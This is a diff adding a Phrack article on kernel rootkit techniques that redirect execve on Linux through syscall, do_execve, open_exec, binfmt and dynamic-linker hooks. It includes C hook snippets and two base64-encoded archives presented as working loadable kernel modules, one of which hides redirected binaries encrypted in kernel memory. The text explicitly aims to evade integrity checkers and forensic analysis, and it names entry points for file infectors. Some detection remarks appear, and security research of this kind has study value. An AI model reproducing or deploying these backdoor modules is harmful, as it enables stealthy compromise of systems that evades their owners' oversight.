@@ -1,0 +1,490 @@
+
+                             ==Phrack Inc.==
+
+               Volume 0x0b, Issue 0x3b, Phile #0x05 of 0x12
+
+|=---=[ 5 Short Stories about execve (Advances in Kernel Hacking II) ]=--=|
+|=-----------------------------------------------------------------------=|
+|=-----------------=[ palmers <palmers@team-teso.net> ]=-----------------=|
+
+--[ Contents
+
+  1 - Introduction
+
+  2 - Execution Redirection
+
+  3 - Short Stories
+    3.1 - The Classic
+    3.2 - The Obvious
+    3.3 - The Waiter
+    3.4 - The Nexus
+    3.5 - The Lord
+
+  4 - Conclusion
+
+  5 - Reference
+
+  Appendix A: stories.tgz.uu
+
+  Appendix B: fluc.c.gz.uu
+
+
+--[ 1 - Introduction
+
+  "Oedipus: What is the rite of purification? How shall it be done?
+Creon: By banishing a man, or expiation of blood by blood ..."
+		- Sophocles, Oedipus the King
+
+  What once was said cannot be banished. Expiation of the wrongs that
+inspire peoples thinking and opinion may change.
+
+  I concern again on kernel hacking, not on literature. Especially in this
+field many, many ideas need to be expiated as useless. That does not mean
+they do not allow to solve particular problems. It means the problems which
+can be solved are not those which were aimed to be solved.
+
+
+--[ 2 - Execution Redirection
+
+  If a binary is requested to be executed, you are redirecting execution
+when you execute another binary. The user will stay unnotified of the
+change. Some kernel modules implement this feature as it can be used to
+replace a file but only when executed. The real binary will remain
+unmodified.
+
+  Since no file is modified, tamper detection systems as [1] or [2] cannot
+percept such a backdoor. On the other hand, execution redirection is used
+in honeypot scenarios to fool attackers.
+
+  Even after years of active kernel development, the loadable kernel
+modules (lkm) implementing execution redirection use merely the same
+technique. As this makes it easy for some admins to percept a backdoor
+faster, others still are not aware of the danger. However, the real danger
+was not yet presented.
+
+
+--[ 3 - Short Stories
+
+  I will show five different approaches how execution can be redirected.
+Appendix A contains working example code to illustrate them. The examples
+do work but are not really capable to be used in the wild. You get the
+idea.
+
+  In order to understand the sourcecodes provided it is helpful to read [4]
+or [5].
+
+  The example code just show how this techniques can be used in a lkm.
+Further, I implemented them only for Linux. These techniques are not
+limited to Linux. With minor (and in a few cases major) modifications most
+can be ported to any UNIX. 
+
+
+--[ 3.1 - The Classic
+
+  Only for completeness, the classic. Redirection is achieved by replacing
+the system call handling execution. See classic.c from appendix A. There is
+nothing much to say about this one; it is used by [3] and explained in [6].
+It might be detected by checking the address pointed to in the system call
+table.
+
+
+--[ 3.2 - The Obvious
+
+  Since the system call is architecture dependent, there is a underlying
+layer handling the execution. The kernel sourcecode represents it in
+do_execve (~/fs/exec.c). The execve system call can be understood as a
+wrapper to do_execve. We will replace do_execve:
+
+	n_do_execve (char *file, char **arvp, char **envp, \
+				struct pt_regs *regs)
+	...
+	if (!strcmp (file, O_REDIR_PATH)) {
+		file = strdup (N_REDIR_PATH);
+	}
+
+	restore_do_execve ();
+	ret = do_execve (file, arvp, envp, regs);
+	redirect_do_execve ();
+	...
+
+  To actually redirect the execution we replace do_execve and replace the
+filename on demand. It is obviously the same approach as wrapping the
+execve system call. For a implementation see obvious.c in appendix A. No
+lkm using this technique is known to me.
+
+  Detecting this one is not as easy as detecting the classic and depends on
+the technique used to replace it. (Checking for a jump instruction right at
+function begin is certainly a good idea).
+
+
+--[ 3.3 - The Waiter
+
+  Upon execution, the binary has to be opened for reading. The kernel gives
+a dedicated function for this task, open_exec. It will open the binary file
+and do some sanity checks.
+
+  As open_exec needs the complete path to the binary to open it this is
+again easy going. We just replace the filename on demand and call the
+original function. open_exec is called from within do_execve.
+
+  To the waiter the same applies as to the obvious. Detection is possible
+but not trivial.
+
+
+--[ 3.4 - The Nexus
+
+  After the binary file is opened, its ready to be read, right? Before it
+is done, the according binary format handler is searched. The handler
+processes the binary. Normally, this ends in the start of a new process.
+
+  A binary format handler is defined as following (see ~/include/linux/
+binfmts.h):
+
+	/*
+	 * This structure defines the functions that are
+	 * used to load the binary formats that linux
+	 * accepts.
+	 */
+	struct linux_binfmt {
+		struct linux_binfmt * next;
+		struct module *module;
+		int (*load_binary)(struct linux_binprm *, \
+				struct pt_regs * regs);
+		int (*load_shlib)(struct file *);
+		int (*core_dump)(long signr, struct pt_regs * regs, \
+				struct file * file);
+		unsigned long min_coredump;	/* minimal dump size */
+	};
+
+  Binary format handlers provide three pointers to functions. One for
+loading libraries, another for producing core dump files, the third for
+loading binaries (pfff ...). We replace this pointer.
+
+  Our new load_binary function looks as follows:
+
+	int new_load_binary (struct linux_binprm *bin, \
+				struct pt_regs *regs) {
+		int ret;
+		if (!strcmp (bin->filename, O_REDIR_PATH)) {
+			/*
+			 * if a binary, subject to redirection, is about
+			 * to be executed just close the file
+			 * descriptor and open a new file. do not
+			 * forget resetup.
+			 */
+			filp_close (bin->file, 0);
+			bin->file = open_exec (N_REDIR_PATH);
+
+			prepare_binprm (bin);
+			goto out;
+		}
+	out:
+		return old_load_binary (bin, regs);
+	}
+
+  But how can we get the binary handlers? They are not exported, if not
+loaded as module. A possibility is executing and watching a binary of all
+available binary formats. Since the task structure inside the kernel
+carries a pointer to the handler for its binary it is possible to collect
+the pointers. (The handlers form a linked list - it is not really needed to
+execute one binary of each type; theoretically at least).
+
+  The reference implementation, nexus.c in appendix A, fetches the first
+binary handler it gets its hands on. This is reasonable since virtually all
+linux distributors use homogeneous ELF based user land. What is more, it
+is very unlikely that the binary format of system binaries change.
+
+  As used by nexus.c, one way of fetching binary handlers. Note that we do
+replace a system call but we restore it immediatly after we got our binary
+handler. This opens a very small time window where the replaced system call
+might be detected (if tried at all). Of course, we could have fetched the
+pointer directly in init_module. In other words: the time window is
+arbitrary small.
+
+	int n_open (char *file, int flags) {
+		int ret = o_open (file, flags);
+
+		/*
+		 * ... get one. be sure to save (and restore)
+		 * the original pointer. having binary hand-
+		 * lers pointing to nirvana is no fun.
+		 */
+		elf_bin = current->binfmt;
+		old_load_binary = elf_bin->load_binary;
+		elf_bin->load_binary = &new_load_binary;
+
+		/*
+		 * and restore the system call.
+		 */
+		sys_call_table[__NR_open] = o_open;
+
+		return ret;
+	}
+
+  An evil attack would of course replace the core_dump pointer, too.
+Otherways it may be possible to detect redirection of execution by letting
+each process, right after creation, coredump. Then one may check properties
+of the dump and if they match, or not, execution may be reinitalized, or
+not, respectively. I do not recomment this method to detect redirection,
+though.
+
+  An evil virus could wrap the load_binary function for infecting all
+binaries executed in memory.
+
+  Even replaced pointers are hard to check if you do not know where they
+are. If we have a recent System.map file, we can walk the list of binary
+handlers since we can look up the address of the root entry ("formats" as
+defined in ~/fs/exec.c) and the handler functions. In other cases we might
+be out of luck. One might try to collect the unmodified addresses himself
+to be able to check them later one. Not a good idea ...
+
+
+--[ 3.5 - The Lord
+
+  What about not redirecting execution at execution time? Where is the
+logic in not redirecting execution flow when it is exactly what we are
+doing here?
+
+  When ELF binaries are executed, the kernel invokes a dynamic linker. It
+does necessary setup work as loading shared libraries and relocating them.
+We will try to make an advantage of this.
+
+  Between execution of a binary at system level and the start of the
+execution at user level is a gap where the setup described above is done.
+And as loading of libraries involves mmap'ing and mprotect'ing we already
+know where we can start. We will just look at these system calls. Shared
+libraries are loaded to the same (static) address (which might differ from
+system to system). If a certain address is to be mapped or mprotect'ed by a
+certain process we restart the execution, with our binary. At this point of
+execution, the process calling mmap or mprotect is the dynamic linker.
+
+  That is was the example implementation in appendix A, lord.c, does.
+
+  Note that we can, of course, look for an arbitrary runtime pattern, there
+is no need for sticking to mmap or mprotect system calls. It is only of
+importance to start the new binary before the user can percept what is
+going on.
+
+  Note, too, that this technique may be used to execute a binary in before
+and afterwards of the binary requested to be executed. That might be useful
+to modify the system enviroment.
+
+  And finally note that we are not forced to sticking to a distinct runtime
+pattern. We may change at will the pattern triggering a redirection. I am
+really curious what people will do to detect execution redirection achieved
+with this method as it is not sufficient to check for one or two replaced
+pointers. It is even not sufficient to do execution path analysis as the
+path can be different for each execution. And it is not enough to search
+the filesystems for hidden files (which might indicate that, too, execution
+redirection is going on). Why is it not enough? See appendix B. All employed
+methods for forensical analysis of execution redirection defeated in one
+module? We could make the decision from/to where and when (and whoms)
+execution shall be redirected dependant on an arbitrary state or pattern.
+
+  This is another handy entry point for an infector.
+
+
+--[ 4 - Conclusion
+
+  We can take complete control of binary execution. There are many ways to
+redirect execution, some are easier to detect than others. It has to be
+asserted that it is not sufficient to check for one or two replaced pointer
+to get evidence if a system has been backdoored. Even if a system call has
+not been replaced (not even redirected at all) execution redirection can
+happen.
+
+  One might now argue it is possible to search the binary redirected to. It
+has to be physically present on the harddisk. Programs have been developed
+to compare the content of a harddisk to the filesystem content shown in
+user land. Therefore it would be possible to detect even hidden files, as
+there might be, if a kernel backdoor is in use.  That is completely wrong.
+
+  Most obviously we would keep the binary totally in kernel memory. If our
+binary needs to be executed, we write it to disk and execute. When
+finished, we unlink it. Of course, it is also possible to copy the binary
+just "in place" when it is to be executed. Finally, to prevent pattern
+matching in kernel memory, we encrypt the data. A approach to this method
+is shown in appendix B. Under linux we can abuse the proc filesystem for
+this purpose, too.
+
+  As long as forensic tools work on with a closed world assumption it will
+be still possible to evade them. Checking for replaced pointers does not
+help unless you check all, not only those "believed to be" important
+(letting alone that pointer checking cannot prove if a function is
+redirected or not). Developers might better invest their time to develop
+tools checking possible execution paths.  Anomaly detection of kernel
+behaviour is a more reliable forensical analysis method than pattern
+matching.
+
+
+--[ 5 - Reference
+
+[1] Tripwire
+    http://www.tripwire.com
+[2] Aide
+    http://www.cs.tut.fi/~rammer/aide.html
+[3] knark
+    http://www.packetstormsecurity.com/UNIX/penetration/rootkits/
+    knark-0.59.tar.gz
+[4] kernel function hijacking
+    http://www.big.net.au/~silvio/kernel-hijack.txt
+[5] Linux x86 kernel function hooking emulation
+    http://www.phrack.org/show.php?p=58&a=8
+[6] LKM - Loadable Linux Kernel Modules
+    http://www.thehackerschoice.com/download.php?t=p&d=LKM_HACKING.html
+
+
+--[ Appendix A: stories.tgz.uu
+
+<++> ./stories.tgz.uu
+begin-base64 644 stories.tgz
+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
+BRVUUEE/Ef0XupwxUgBQAAA=
+====
+<-->
+
+
+--[ Appendix B: fluc.c.gz.uu
+
+<++> ./fluc.c.gz.uu
+begin-base64 644 fluc.c.gz.uu
+H4sICDFK+jwCA2ZsdWMuYwDtXHlv3DYW/zvzKRgXWIyNsT26Z+ptAKNxWyOp
+HfhAttsWAx2UrY1Gmo40cbzdfPflIynxEDWjeGvsYneNCBqSjz++i4+HyBwf
+jNABenv+7dnF9dnX8Lu+zyqUZjlGy/ARRRjF5SrDCSrXKNms8iwOa5LKChQW
+jygt18sJSUDFh/uSVCJkpGwVrusJWpZJlvK6RUkywgrlZXEHb2gGahH0x3V2
+d18DRRZjRFpfrfEKFwmpeHvx4+Xr8+/Oz14fEWKgvwH24jLhhGWZIvIvLosY
+r+ojUoxRuKnvSYtxCDwmaLmpaqhJ8EGcZUjqrnG1KosqiwjHRAaQBcSI802S
+Ef6iDWUH5dkyI9JStZSUIEtwUYc5SETarPBvG5LOSEYSLsM7PCHvOiRCVhUh
+gXoVXn8EscpNTcoZgxL7HzMQc+/0Gp1f71F235/f/HB5ewN1Ty9+Qu9Pr67O
+Lm5+OkK312fo/Aad3qCfLm/R5fsLdHV+/abRCzUbYBLNg0Zq0s67+3UYf0Dj
+h4eHoxX9fVSu7/YRIcniHFNznyYfQ6K7Cqz2Bq8LnKMfCCFo4fwcRY8EMF/i
+dYWOUY2rklQ5Ho2+SnCaFRgtFm/Ori7O3i4WbRax1+3bs9FXTJkY/TnPis2n
+Y+IKmxwf3b/qlFT1mjRmLMnDyJS/XJpy08qYm+mthtXyeFNkVZ0Y8sOYqIIC
+iZI9wiHx/KN4Twj+7eXrs+vzv56hYFTVIdEmiu/DNYK/cnFPzJjj9c/Bryed
+0qIt/RV9g/Z++RTNfvk0napPmv7yCU/3Tkajj2WWIOmPWC0sNqsFU+d4n5AQ
+7jYx8eysWKxxkq3R7yNK2bTI/g7KxSqs7ycj1P07KGjZyeizlk/xSBMaFm0L
+/BxkeHF8gH7AeV6i9+U6T16CfwANES0gYrgeeWLy+EQ0S3qm2569BoImbf52
++Fur7pNnBmUueYg2HbcLQR6bF/e1yqoRuibPVyBsXtUK+XvekJlhNEEgezZV
+mZTTscZN3KMLT2Pc1dKO5klmXaRa63ra0mAspwNhbN3aljZD8EduXU+ndtOU
+AiGye3QDjHe4MepChoH03FV1I6ensYCwNPeS5fW3cSMgbI1spglC0nNPar1N
+CwhwH82x9XSHG7NfdAw604Qi6Zklc9NCyNm2Jreenpr7iN66TeKHT2KHT7qa
+b0tpQmcnUhluIQKimgA4wORNnNhP2W/H7hfS6vFOzZndgDwEyvN6YohtdnDd
+wN62HqsYVSELtnd0YeCt3azzWCZud0O4O4T6Qi4GDALS44WaAV11AIBxxwBh
+a5awNdltDSYKzeOIBuPOugOADBO7RkEs3S8iDVaBEeOIsx2mA2tW50yLB7pQ
+zlxNY6jjqj11ZuhKjUoxewfTJ/mFbcgTgaCF8B1DR/dFy4HdxAfym3Dq8zIv
+bSG8lMFAzPAtnvZFNchrWg6IP/ieGcJlRbRF8vYDXsXhLfOyBp7SWUKQhJHQ
+4qZlnwnFWiP+QPLdlP1uYYVFmmq02OM68RhnDYSnxVMQXBKkRbUYg/CbVkm4
+HngTMhwTWHAxSG6TwAJCk5uSBLxKKgnZ4VaxiJdKUTvm6iNkrsPKYECg/mLx
+t6N4585qxgHAPLLbw6axIiSbZ7/WlplNfzcDNVlcy9N5d/wQsbJ/isKzqaEA
+IumObrNoUARPY20246sjG9bLA+NcK53qZOo4S6dsXid2UjIpfqYzA4wU0WCk
+nxGBsXBwiMjAJAw5Hvw2LCi8iM2GYoc1YXXHVKg216pBnh2ogkLezDZOXaGV
+eM5a0deODmEcu6pwkG8LQbAuu2EJantdi/iz3giO52ycgKryAzCqxURnn3Vb
+B5ikD8Y1zn4BxjJwE/fBUOE7oxmFMXATaTBPnOVAqMGk73iYu5UF/iQs4jI1
+efCAe9mMo5gOvSqXScz9QlWnByOYz0h8rRoYPHI0fbiMk1QsdYXPf6mzCwht
+GgKxAaCsWFvyeUw4iOLQe1MxFCWagzMmWZ/Z9nhST9WEoEsX8tvh0Ut3fhg0
+HWIZHLUQIERo8aglqXKWMCGnXH2Wp9MILiLRnUAoIxxwJXEBjhAJCH1aqqgt
+YWWxy4zp8zmZoY+A8cADZfvHgZi6K/qwzJPGOVOllzCr4IhxsN0qLYTZYD2W
+UpoS6iTJyLCw7oOBzTW2Ouh0dlmNYOhWjbyLUZ345sCnhVZQbQJdCwvV6roC
+zqUpis2FoALFPPAPEkp1cK2FYbpR/EJ3H/A+PW4kli6ciFoyB7yXDhOqd0yN
+ItZXZBU3PTcxjyPAFO0PMe9yjuhyVECHdTsKE3F6Op6IqBX1GG2npbbGzq4z
+myyljuxPCsEtBLQA5JY0j5jzuUQSqIZUJhE9e3yWOtOD5S5dWMT8Sdl6zYM5
+urSYsKW9GoAIn7TsT+Lt0xTzfsbOvZypNhSp4ylENaMu9KG4s2GlbI8JCM/Q
+mqXNgmWDtuXqdpCmws7iOhq0r2V5O1To6Et/EcFlS9jb1+yWeY/P0pcxWneK
+NEtY5qEocjUy0zaqsoFt9guNTO4b4NgzrRlpiiKT6e6VTtVy6AyG6dozbI39
++yH0+bZpYSGefi5mQzu+uk4N1cmSraUdLe2GxsmBqSW6JeCwB2Bs3uHZvrAy
+CNhzVtzuFszZmqzZaGjKYBfB4SsDZ6rs8dEsT7QCwR9GLHi7vIkuZwKiw+BQ
+zgREh8GhnHWMul11Js4EF4NUZ+JMWGSQ6v5v1P8Oo+6aJFjGkNO02uztOda2
+8aQ/allDYVWI2Zd9pWFQYjExiOn/cV1MxbeCYM62k5vtY1/doGvJXLEPLsik
+Tw4znU7sa2nkylcIviceSFzRDf9UheD9w7X4DvScffRsuQmk6vzrBeNK/eiF
+2Rw8aDiQ5O8td5VpfEsWcBLOGayMWmEcLmTafCNQ1PklVZvPCrpFbLHu0Jlu
+raLRBAICsgK3axH6tULKD6Y6rdBFY7yZBuWrcAo3qfqVxhIGlLVvzPeYYdm3
+E3VhJX1CMRmxLZ+zjzyaIH7z6SQVFlBg+srEbryfampzmMNT95GrdPIULvzm
+8xIXpukj3X4hhP2Pnv32PVY0bJ1qd4/v6Od0hpzL+aKv/r0QtrPjDILdG8HV
+QyLaSZknqtPdtb1uhvC2n8foWbPbGtOOO5QblYsd1ZzAtIbf6ReetoMAaZnb
+2XSYLqxB53L0TytOuuMsit27lyMznWhMz72n+cWO04RusHOdStfwmop71ux0
+ZLK3fIYd6Bf2dq/0XNPGhLL5YGJa36+YuSqN84f6ReeIhu4H80F+oe/lRBrT
+nRmh+7R4MdMPlJgh5tstE5k/vUG2TGrv4iYaFi80pgNv2Djib9/fTHRuvaeN
+I8P8Ioh2uJffqwt5r4a+JRfz/qBxxNVPom7fB+9RsXoKWcxytPjoD4hYPecv
+tpHr57kG+oW+oR1r+rDi5/SLWTzkMKJ5HHE1Z5aZ9p9lfjF3h/mF4QS24cOw
+furYeuK8cxfT4TC/cLq6UHZfXW2QcJ/TL0J3x+Flp3feqR+VlpnunIn2/pBx
+JEye5Bc9XzKTaff89zP4ReQ+yS8STcVJ57T6c/pFFA1VsXrYSvuWjDUV288z
+jsQDxxHDYCDOHagQ/r++Tt0x9MS+ydl3xwvtsITOrfWsfhFHQ1cEu7mQmE7s
+Z1mPJD2xM3iSUSmTEtPB7Fn8wjJ2tS82KnxukwVNwufbv4Drc0Puz42OlfuT
+1WO12BR5VnyYoGWYFfkjOjo6otces6IeJTjHNV7AtcIxvRZ3kBbhEu+P2K07
+QqJcocPrdblG36DpifFSHlQlpRe3b98yAn6ZDy6Zrh8JAf9hIIGqGb1sWiRE
+Cnq3kKEt2H3FMWOMl2UpGsMlv0VWZPUYSibo7eXlm9t3i3encMF0gv5UJPv7
+oxcNy5T6Icw/cGoolsAoGSG/K+sS4U9Zzcua6odn59evz69O2gpFcpSHVb2o
+H1cYvfwGvT29vllcXF79KINYHCUpH4oxafGIKeDwVUIYLxN8+CpbVHi5z2Bb
+7eRl+YFY9T6s7mktaGiC2uqcvGHt3c3V4uzqatwWtjy+PL+WS/bR76MXEu9H
+oImfm0SOi18J71C35d8+EQr8mDaeNO4KMkFq64hV/3r0Illt6rHC92dGQky6
+VSMjhmF9Tamp+dbEW8MKj1vbAQEv39QgzZg7CWStcb1ZF0xNJ6PPvPuMHtYZ
+8fgoK0wOz72R3hdnV0ZrBrZcErbuloTZBe0SacUlTSuimztcL9JqzBuuWIrf
+JX593SiFgBFagr1alCtcMI+eoMvFt1dnp8RjrxfnV+//cov+wX993/665Mhh
+XS6zmGgqHv+JoB2+ShdxuSnq/RO4t/q3TVUjYrmQhomHcF3AtWe44MxbB/py
+dfiKqmBMMibt3dcJqrK/4zIdNxn7pIvwKquyUiVLm3QKxiVUTRJEi/Oy4uDT
+faZ3PU6M7nCxoNKPG8VzYzWdfe9ovSkO43VZVEfZJXbe/7bHsXQLjQqqzAX+
+hOPGoqRsq0FpCcRJmgUBkdBlec5CI808Fp2IQMRLEn8IxATRO8SHr9j1Y9Gj
+eDa7eYy+YQGOljLhlFIkiX/CKIRTKrRQ/Hn0gnIvIqFOQjsVwnmFUZeXlxIv
+crTvtPMhXWNDts67iNy8Hy/xMl49jlsjTMSV8Ul7sVx0SQIh7EUtddIDUxhh
+ZG+hxgSngKEMRoJ2IGzGL6IOJhJp9sMyzPMyHnNH1y+aE4f//rt3/H8AIJZt
+jAgqoK0dWo0QkgvArffjerk6zqs9pVhTGC06GNP/LuJgn4w+7cV5C27O04J9
+JPmyqhWhCklBmnKHalBS4FSKi/pcgqtwqHk/j/4JM0vxWXxDAAA=
+====
+<-->
+
+EOF
